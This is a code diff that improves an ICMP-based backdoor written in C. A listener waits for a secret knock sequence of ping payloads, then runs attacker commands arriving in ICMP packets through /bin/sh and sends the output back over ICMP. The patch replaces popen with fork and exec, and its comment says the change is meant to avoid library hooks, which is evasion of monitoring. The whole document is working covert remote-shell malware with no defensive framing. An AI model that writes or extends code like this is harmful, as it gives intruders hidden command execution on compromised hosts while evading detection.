@@ -10,6 +10,7 @@
 #include <sys/stat.h>
 #include <sys/socket.h>
 #include <sys/types.h>
+#include <sys/wait.h>
 #include <netdb.h>
 #include <signal.h>
 #include "includes/icmp_common.h"
@@ -87,7 +88,7 @@ int send_icmp_response(int sock, struct sockaddr_in *client_addr, const char *da
                  (struct sockaddr *)client_addr, sizeof(struct sockaddr_in));
 }
 
-// Handle ICMP shell commands
+// Replace the existing handle_icmp_shell function with this version:
 void handle_icmp_shell(int sock, struct sockaddr_in client_addr) {
     char buffer[BUFSIZE];
     socklen_t addr_len = sizeof(client_addr);
@@ -146,18 +147,76 @@ void handle_icmp_shell(int sock, struct sockaddr_in client_addr) {
                 return;
             }
 
-            FILE *fp = popen(command_buffer, "r");
-            if (!fp) {
-                const char *err = "Failed to run command\n";
+            // Use fork+exec instead of popen to avoid library hooks
+            int pipefd[2];
+            if (pipe(pipefd) == -1) {
+                const char *err = "Failed to create pipe\n";
                 send_icmp_response(sock, &client_addr, err, strlen(err), original_id);
+                continue;
+            }
+
+            pid_t pid = fork();
+            if (pid == -1) {
+                const char *err = "Failed to fork\n";
+                send_icmp_response(sock, &client_addr, err, strlen(err), original_id);
+                close(pipefd[0]);
+                close(pipefd[1]);
+                continue;
+            }
+
+            if (pid == 0) {
+                // Child process
+                close(pipefd[0]);
+                dup2(pipefd[1], STDOUT_FILENO);
+                dup2(pipefd[1], STDERR_FILENO);
+                close(pipefd[1]);
+                
+                execl("/bin/sh", "sh", "-c", command_buffer, (char *)NULL);
+                exit(127); // If execl fails
             } else {
-                char line[BUFSIZE];
-                while (fgets(line, sizeof(line), fp)) {
-                    line[strcspn(line, "\n")] = 0;
-                    send_icmp_response(sock, &client_addr, line, strlen(line), original_id);
-                    usleep(10000);
+                // Parent process
+                close(pipefd[1]);
+                
+                char output[1024];
+                ssize_t bytes_read;
+                FILE *fp = fdopen(pipefd[0], "r");
+                
+                if (fp) {
+                    while (fgets(output, sizeof(output), fp)) {
+                        output[strcspn(output, "\n")] = 0; // Remove newline
+                        send_icmp_response(sock, &client_addr, output, strlen(output), original_id);
+                        usleep(10000); // Small delay between packets
+                    }
+                    fclose(fp);
+                } else {
+                    // Fallback: read directly from pipe
+                    while ((bytes_read = read(pipefd[0], output, sizeof(output)-1)) > 0) {
+                        output[bytes_read] = '\0';
+                        char *line = output;
+                        char *next_line;
+                        
+                        // Handle multiple lines in one read
+                        while ((next_line = strchr(line, '\n'))) {
+                            *next_line = '\0';
+                            if (strlen(line) > 0) {
+                                send_icmp_response(sock, &client_addr, line, strlen(line), original_id);
+                                usleep(10000);
+                            }
+                            line = next_line + 1;
+                        }
+                        
+                        // Send remaining data if any
+                        if (strlen(line) > 0) {
+                            send_icmp_response(sock, &client_addr, line, strlen(line), original_id);
+                            usleep(10000);
+                        }
+                    }
+                    close(pipefd[0]);
                 }
-                pclose(fp);
+                
+                // Wait for child to finish
+                int status;
+                waitpid(pid, &status, 0);
             }
 
             send_icmp_response(sock, &client_addr, "__END__", strlen("__END__"), original_id);
@@ -253,56 +312,56 @@ int main() {
 	int ip_header_len = ip_header->ihl * 4;
 
 	if (n < (ssize_t)(ip_header_len + sizeof(struct icmp_header))) {
-	    continue; // Not a complete ICMP packet
+	   continue; // Not a complete ICMP packet
 	}
 
 	struct icmp_header *icmp_hdr = (struct icmp_header *)(buffer + ip_header_len);
 
 	// Only process echo requests (ICMP_ECHO)
 	if (icmp_hdr->type != ICMP_ECHO) {
-	    continue;
+	   continue;
 	}
 
 	char *payload = (char *)(icmp_hdr + 1);
 	int payload_len = n - ip_header_len - sizeof(struct icmp_header);
 
 	if (payload_len > 0) {
-	    payload[payload_len] = '\0';
+	   payload[payload_len] = '\0';
     
-	    // Check if this is a shell command (has custom header)
-	    if (payload_len >= (int)sizeof(struct custom_icmp_header)) {
-	        struct custom_icmp_header *custom_hdr = (struct custom_icmp_header *)payload;
-	        if (ntohl(custom_hdr->magic) == 0xDEADBEEF) {
-	            // This is a shell command, ignore in knock mode
-	            continue;
-	        }
+	   // Check if this is a shell command (has custom header)
+	   if (payload_len >= (int)sizeof(struct custom_icmp_header)) {
+	       struct custom_icmp_header *custom_hdr = (struct custom_icmp_header *)payload;
+	       if (ntohl(custom_hdr->magic) == 0xDEADBEEF) {
+	           // This is a shell command, ignore in knock mode
+	           continue;
+	       }
     	}
     
-	    // Process as knock sequence
-	    if (strcmp(payload, EXPECTED_SEQUENCE[sequenceIndex]) == 0) {
-	        sequenceIndex++;
+	   // Process as knock sequence
+	   if (strcmp(payload, EXPECTED_SEQUENCE[sequenceIndex]) == 0) {
+	       sequenceIndex++;
         
-	        if (sequenceIndex == EXPECTED_SEQUENCE_SIZE) {
-	            printf("[*] Correct sequence received. Entering shell mode…\n");
-	            shell_mode = 1;
-	            shell_client = cliaddr;
+	       if (sequenceIndex == EXPECTED_SEQUENCE_SIZE) {
+	           printf("[*] Correct sequence received. Entering shell mode…\n");
+	           shell_mode = 1;
+	           shell_client = cliaddr;
             
-	            // Send acknowledgment
-	            const char *msg = "Shell access granted.\n";
-	            send_icmp_response(sock, &cliaddr, msg, strlen(msg), icmp_hdr->un.echo.id);
+	           // Send acknowledgment
+	           const char *msg = "Shell access granted.\n";
+	           send_icmp_response(sock, &cliaddr, msg, strlen(msg), icmp_hdr->un.echo.id);
             
-	            // Handle shell commands
-	            handle_icmp_shell(sock, cliaddr);
+	           // Handle shell commands
+	           handle_icmp_shell(sock, cliaddr);
             
-	            // Return to knock mode after shell session
-	            shell_mode = 0;
-	            sequenceIndex = 0;
-	            printf("[*] Returning to knock mode.\n");
-	        } 
-	    } else {
-	        sequenceIndex = 0;
-	        printf("[*] Invalid knock sequence. Resetting.\n");
-	    }
+	           // Return to knock mode after shell session
+	           shell_mode = 0;
+	           sequenceIndex = 0;
+	           printf("[*] Returning to knock mode.\n");
+	       } 
+	   } else {
+	       sequenceIndex = 0;
+	       printf("[*] Invalid knock sequence. Resetting.\n");
+	   }
 	}
         mutate_main();
     }
